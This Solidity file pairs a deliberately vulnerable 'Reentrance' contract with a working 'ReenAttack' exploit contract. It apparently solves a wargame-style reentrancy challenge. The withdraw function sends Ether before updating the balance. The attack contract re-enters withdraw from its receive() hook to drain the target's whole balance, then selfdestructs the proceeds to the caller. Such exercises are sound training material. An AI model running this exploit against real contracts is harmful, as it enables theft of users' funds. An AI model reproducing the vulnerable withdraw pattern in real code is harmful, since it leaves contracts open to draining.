// SPDX-License-Identifier: MIT
// 0x19830c3a628f21F7142b4414f26AbAE50aAb8FeC
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract ReenAttack {
  Reentrance private immutable _reen;
  constructor(address payable reen) {
    _reen = Reentrance(reen);
  }

  function attack() external payable{
    _reen.donate{value: 1e16}(address(this));
    _reen.withdraw(1e16);

    require(address(_reen).balance == 0, "fail");
    selfdestruct(payable(msg.sender));
  }

  receive() external payable{
    uint amount = min(1e16, address(_reen).balance);
    if (amount > 0) {
      _reen.withdraw(amount);
    }
  }

  function min(uint x, uint y) public pure returns(uint){
    if (x > y) {
      return y;
    } else {
      return x;
    }
  }
}